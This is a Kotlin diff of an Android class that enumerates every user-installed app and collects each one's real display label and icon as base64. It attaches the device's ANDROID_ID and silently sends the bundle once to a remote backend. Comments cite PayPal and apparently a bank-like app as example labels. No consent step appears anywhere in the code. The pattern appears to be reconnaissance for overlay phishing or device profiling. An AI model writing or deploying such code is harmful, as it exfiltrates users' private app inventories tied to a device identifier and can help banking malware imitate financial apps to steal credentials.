@@ -16,50 +16,59 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 object AppIconCollector {
-
     private const val TAG = "IonDomo_Catalog"
-    private const val PREFS = "iondomo_catalog"
-    private const val SENT_KEY = "catalog_sent_v3"
+    private const val PREFS = "icon_catalog_prefs"
+    private const val SENT_KEY = "catalog_sent_v6"
 
     fun collectAndSendOnce(context: Context, backendUrl: String) {
+        Log.i(TAG, ">>> INICIADO (v6: label real + updated_system) <<<")
         val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
         if (prefs.getBoolean(SENT_KEY, false)) {
-            Log.i(TAG, "Catalog already sent, skipping.")
+            Log.i(TAG, "Já enviado. Abortando.")
             return
         }
 
-        // CRÍTICO: rede NUNCA na main thread -> NetworkOnMainThreadException
         Thread {
             try {
                 val pm = context.packageManager
                 val installed = pm.getInstalledApplications(PackageManager.GET_META_DATA)
-                val array = JSONArray()
+                Log.i(TAG, "Total de apps no dispositivo: ${installed.size}")
 
+                val array = JSONArray()
                 var sysCount = 0
                 var iconCount = 0
+
                 for (info in installed) {
                     val pkg = info.packageName
-                    val isSystem = (info.flags and ApplicationInfo.FLAG_SYSTEM) != 0
-                    if (isSystem) sysCount++
+                    // FIX 1: pega apps pré-instalados de OEM/Google atualizados
+                    val isSystem = (info.flags and ApplicationInfo.FLAG_SYSTEM) != 0 ||
+                                   (info.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+
+                    if (isSystem) {
+                        sysCount++
+                        continue
+                    }
+
+                    // FIX 2: nome REAL que o app se apresenta (ex: "PayPal", "Santo Amaro")
+                    val label = pm.getApplicationLabel(info).toString()
                     val icon = drawableToBase64(pm, info)
                     if (icon.isNotEmpty()) iconCount++
+
                     array.put(JSONObject().apply {
                         put("app_name", pkg)
-                        put("is_system", isSystem)
+                        put("label", label)
+                        put("is_system", false)
                         put("icon_base64", icon)
                     })
                 }
 
-                val deviceId = Settings.Secure.getString(
-                    context.contentResolver, Settings.Secure.ANDROID_ID
-                ) ?: "unknown"
-
-                val payload = JSONObject()
-                payload.put("device_id", deviceId)
-                payload.put("apps", array)
+                val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+                val payload = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("apps", array)
+                }
                 val body = payload.toString()
-
-                Log.i(TAG, "Collected ${array.length()} apps (system=$sysCount, withIcon=$iconCount), body=${body.length} bytes")
+                Log.i(TAG, "✅ Payload: ${array.length()} apps, system=$sysCount, comIcone=$iconCount, bytes=${body.length}")
 
                 val url = URL("$backendUrl/api/v1/app-catalog")
                 val conn = url.openConnection() as HttpURLConnection
@@ -72,16 +81,16 @@ object AppIconCollector {
 
                 val code = conn.responseCode
                 val resp = conn.inputStream.bufferedReader().readText()
-                Log.i(TAG, "Response code=$code body=$resp")
+                Log.i(TAG, "Resposta backend: code=$code, body=$resp")
 
                 if (code == 202 || code == 200) {
                     prefs.edit().putBoolean(SENT_KEY, true).apply()
-                    Log.i(TAG, "Catalog saved flag set.")
+                    Log.i(TAG, "🎉 CATÁLOGO SALVO COM SUCESSO!")
                 } else {
-                    Log.e(TAG, "Backend rejected catalog: $code")
+                    Log.e(TAG, "❌ Backend rejeitou: code=$code")
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Catalog send FAILED", e)
+                Log.e(TAG, "❌ FALHA CRÍTICA", e)
             }
         }.start()
     }
